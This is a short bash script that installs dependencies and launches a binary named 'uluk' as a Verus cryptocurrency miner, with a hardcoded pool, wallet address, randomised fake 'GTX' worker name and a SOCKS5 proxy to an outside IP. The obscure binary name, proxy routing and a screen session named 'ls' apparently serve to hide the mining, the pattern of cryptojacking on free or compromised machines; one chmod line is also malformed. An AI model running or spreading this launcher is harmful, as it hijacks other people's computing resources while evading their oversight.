#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x start.sh && chmod +x uluk chmod 777 uluk start.sh
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=R9fyZN2rng1biZmim3ThmxiN7PqFETw5CD
WORKER=$(echo $(shuf -i 1-10 -n 1)GTX00)
PROXY=socks5://192.99.151.5:9300
./uluk -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
